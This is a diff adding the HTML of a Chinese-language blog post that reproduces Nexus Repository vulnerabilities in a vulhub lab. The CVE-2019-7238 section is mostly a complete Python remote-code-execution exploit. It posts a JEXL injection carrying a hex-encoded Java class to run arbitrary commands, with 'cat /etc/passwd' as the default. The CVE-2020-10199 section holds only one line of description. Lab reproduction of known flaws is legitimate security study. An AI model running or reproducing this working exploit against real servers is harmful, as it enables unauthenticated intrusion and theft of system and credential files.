@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="以下漏洞的复现环境都是vulhub+centos。 CVE-2019-7238 未授权访问的用户可以构造请求而造成任意代码执行。而且因为3.15.0+以上的版本增加了用户认证，所以3.15.0+的版本不受此突破的影响。  可以利用以下脚本：https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2019-7238&#x2F;blob&#x2F;master&#x2F;CVE-2019-7238.py 1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nexus漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="以下漏洞的复现环境都是vulhub+centos。 CVE-2019-7238 未授权访问的用户可以构造请求而造成任意代码执行。而且因为3.15.0+以上的版本增加了用户认证，所以3.15.0+的版本不受此突破的影响。  可以利用以下脚本：https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2019-7238&#x2F;blob&#x2F;master&#x2F;CVE-2019-7238.py 1234567891">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tmpimgs/image-20201215200705593.png">
+<meta property="article:published_time" content="2020-12-15T11:34:43.000Z">
+<meta property="article:modified_time" content="2020-12-15T11:34:43.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="nexus">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tmpimgs/image-20201215200705593.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>nexus漏洞复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/01/13/%E8%87%B4%E8%BF%9COA%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=nexus漏洞复现&body=Check out this article: http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=nexus漏洞复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-7238"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-7238</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-10199"><span class="toc-number">2.</span> <span class="toc-text">CVE-2020-10199</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        nexus漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-15T11:34:43.000Z" itemprop="datePublished">2020-12-15</time>
+        
+        (Updated: <time datetime="2020-12-15T11:34:43.000Z" itemprop="dateModified">2020-12-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/nexus/">nexus</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/nexus/" rel="tag">nexus</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>以下漏洞的复现环境都是vulhub+centos。</p>
+<h3 id="CVE-2019-7238"><a href="#CVE-2019-7238" class="headerlink" title="CVE-2019-7238"></a>CVE-2019-7238</h3><blockquote>
+<p>未授权访问的用户可以构造请求而造成任意代码执行。而且因为3.15.0+以上的版本增加了用户认证，所以3.15.0+的版本不受此突破的影响。</p>
+</blockquote>
+<p>可以利用以下脚本：<a href="https://github.com/jas502n/CVE-2019-7238/blob/master/CVE-2019-7238.py" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-7238/blob/master/CVE-2019-7238.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Created by R17a</span></span><br><span class="line"><span class="comment"># python 3.7.4</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># import requests.packages.urllib3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># requests.packages.urllib3.disable_warnings()</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">banner = <span class="string">'''</span></span><br><span class="line"><span class="string">   _______      ________    ___   ___  __  ___      ______ ___  ____   ___  </span></span><br><span class="line"><span class="string">  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |____  |__ \|___ \ / _ \ </span></span><br><span class="line"><span class="string"> | |     \ \  / /| |__ ______ ) | | | || | (_) |______ / /   ) | __) | (_) |</span></span><br><span class="line"><span class="string"> | |      \ \/ / |  __|______/ /| | | || |\__, |______/ /   / / |__ &lt; &gt; _ &lt; </span></span><br><span class="line"><span class="string"> | |____   \  /  | |____    / /_| |_| || |  / /      / /   / /_ ___) | (_) |</span></span><br><span class="line"><span class="string">  \_____|   \/   |______|  |____|\___/ |_| /_/      /_/   |____|____/ \___/ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        Nexus RCE &lt; 3.15.0</span></span><br><span class="line"><span class="string">                        Python By jas502n  </span></span><br><span class="line"><span class="string">             python  CVE-2019-7238.py http://10.10.20.166:8081 whoami                                                  </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">print(banner)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CVE_2019_7238</span><span class="params">(url, cmd)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> url[<span class="number">-1</span>] == <span class="string">'/'</span>:</span><br><span class="line">        vuln_url = url + <span class="string">"service/extdirect"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        vuln_url = url + <span class="string">"/service/extdirect"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0"</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">"*/*"</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">"application/json"</span>,</span><br><span class="line">        <span class="string">'X-Requested-With'</span>: <span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">"7244"</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">"close"</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">"no-cache"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"&#123;\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [&#123;\"sort\": [&#123;\"direction\": \"ASC\", \"property\": \"name\"&#125;], \"start\": 0, \"filter\": [&#123;\"property\": \"repositoryName\", \"value\": \"*\"&#125;, &#123;\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass)&#123;   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length())&#123;       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   &#125;;defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\n    y,\\n   'Exploit.Test234',\\n    z.getBytes('latin1'),    0,\\n    3054\\n);x.getMethod('test', ''.class).invoke(null, '%s');'done!'&#125;\\n\"&#125;, &#123;\"property\": \"type\", \"value\": \"jexl\"&#125;], \"limit\": 50, \"page\": 1&#125;], \"method\": \"previewAssets\"&#125;"</span> % cmd</span><br><span class="line">    r = requests.post(vuln_url, data=payload, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">"\nurl= %s\n"</span> % vuln_url)</span><br><span class="line">        print(<span class="string">"cmd= %s\n"</span> % cmd)</span><br><span class="line">        print(<span class="string">"&gt;&gt;&gt;&gt; \n"</span> + r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.116.132:8081/"</span></span><br><span class="line">    cmd = <span class="string">"cat /etc/passwd"</span></span><br><span class="line">    <span class="comment"># url = sys.argv[1]</span></span><br><span class="line">    <span class="comment"># cmd = sys.argv[2]</span></span><br><span class="line"></span><br><span class="line">CVE_2019_7238(url, cmd)</span><br></pre></td></tr></table></figure>
+
+<p><img src="tmpimgs/image-20201215200705593.png" alt="image-20201215200705593"></p>
+<h3 id="CVE-2020-10199"><a href="#CVE-2020-10199" class="headerlink" title="CVE-2020-10199"></a>CVE-2020-10199</h3><blockquote>
+<p>该漏洞需要至少普通用户身份。</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-7238"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-7238</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-10199"><span class="toc-number">2.</span> <span class="toc-text">CVE-2020-10199</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=nexus漏洞复现&body=Check out this article: http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=nexus漏洞复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=nexus漏洞复现" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
